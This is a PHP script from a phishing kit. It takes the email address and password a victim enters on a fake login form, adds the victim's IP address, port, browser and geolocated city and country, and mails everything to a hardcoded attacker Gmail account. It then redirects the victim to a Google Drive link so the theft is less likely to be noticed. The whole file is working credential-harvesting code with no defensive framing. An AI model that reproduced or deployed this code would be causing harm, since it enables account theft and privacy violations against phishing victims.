<?php
$Email = $_POST['Email'];
$password = $_POST['password'];
$ip = $_POST['ip'];

$TheBoss = "ceo.president321@gmail.com";
require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();

$ip = getenv("REMOTE_ADDR");
$port = getenv("REMOTE_PORT");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate = date("D M d, Y g:i a");
$logId = uniqid();
$geoplugin->locate();
$subject = "YourLogs Logs by Anthrax Linkers - $country ($logId)";
$headers = "From:  Result Server <noreplay.dgz.gdn@protonmail.com>";

$message .= "---------------|54|---------------\n";
$message .= "Email: $Email\n";
$message .= "Password: $password\n";
$message .= "IP Address : $ip\n";
$message .= "Port : $port\n";
$message .= "Date : $adddate\n";
$message .= "User-Agent: " . $browser . "\n";
$message .= "--------------------------------------------\n";
$message .= "City: {$geoplugin->city}\n";
$message .= "Region: {$geoplugin->region}\n";
$message .= "Country Name: {$geoplugin->countryName}\n";
$message .= "Country Code: {$geoplugin->countryCode}\n";
$message .= "-------------- modified by anthrax.win32@outlook.com -----------------\n";
$message .= "$logId\n";

mail($TheBoss, $subject, $message, $headers);

echo "<html><head><script>window.top.location.href='https://drive.google.com/file/d/1WaMliLzZ5bR5HIbc8VULfwEKDAp5GBJ6/view?fbclid=IwAR1i7nEA1gqnVdRjWgF8Q5PLJ4cETHGqXJBxoiRwRP6rQAg9N4yCAG9Cxug';</script></head><body></body></html>";

?>
